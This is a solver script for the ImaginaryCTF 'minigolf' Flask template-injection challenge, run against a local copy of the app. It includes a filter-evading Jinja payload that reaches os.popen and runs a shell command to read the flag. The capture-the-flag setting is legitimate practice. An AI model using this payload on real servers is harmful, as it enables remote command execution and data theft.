#!/usr/bin/env python3
"""Solve ImaginaryCTF `minigolf` -- blacklisted, length-capped Flask SSTI.

Recon: `app.py` passes `request.args["txt"]` straight into
`render_template_string`. It blacklists `{{`, `}}`, `[`, `]`, `_` and caps the
template at 69 characters. Classic server-side template injection, "golfed".

Clue: you can't use `{{...}}` or `_`, so:
  * Use `{% set %}` statement tags instead of `{{ }}`.
  * Smuggle the forbidden strings (`__globals__`, the shell command) through
    `request.args`, referenced as `a.g` / `a.c` (attribute access dodges the
    `_` and `[]` filters).
  * Reach os via a Jinja global: `(cycler.next|attr(a.g)).os`.

The upstream author exfiltrated out-of-band to a webhook; we do everything
LOCALLY instead: launch the app on 127.0.0.1, run the payload with the shell
command `cat flag.txt 1>&2` so the flag lands on the server's stderr (os.popen
only pipes stdout, so fd 2 is inherited), then read it back and stop the
server. No third-party host is ever contacted.

Fetch first:  python challenges/fetch.py minigolf
"""
import os
import re
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
APP = os.path.join(REPO, "challenges", "minigolf", "challenge", "app")
PORT = 1337

PAYLOAD = "{%set a=request.args%}{%set b=(cycler.next|attr(a.g)).os.popen(a.c)%}"


def main() -> None:
    srv = subprocess.Popen(
        [sys.executable, "app.py"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=APP,
    )
    try:
        time.sleep(2)
        requests.get(
            f"http://127.0.0.1:{PORT}/",
            params={"txt": PAYLOAD, "g": "__globals__", "c": "cat flag.txt 1>&2"},
            timeout=5,
        )
        time.sleep(0.5)
    finally:
        srv.terminate()
        try:
            out = srv.communicate(timeout=5)[0]
        except subprocess.TimeoutExpired:
            srv.kill()
            out = srv.communicate()[0]
    match = re.search(r"ictf\{[^}]*\}", out.decode(errors="replace"))
    print("FLAG:", match.group(0) if match else "not found")


if __name__ == "__main__":
    main()
